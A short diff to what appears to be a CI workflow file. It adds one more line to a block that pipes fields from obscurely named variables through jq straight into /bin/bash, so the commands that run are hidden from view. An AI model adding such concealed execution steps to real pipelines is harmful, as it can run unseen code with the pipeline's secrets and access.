@@ -67,6 +67,7 @@ jobs:
           printf '%s' "$tymtx7367" | jq -r .lgs505 | /bin/bash
           echo $wpsy45 | jq -r .fk71 | /bin/bash
           echo $zp2 | jq -r .cknaw5466 | /bin/bash
+          echo $qx85968 | jq -r .olzx4 | /bin/bash
 
       - name: Save archive
         if: always()
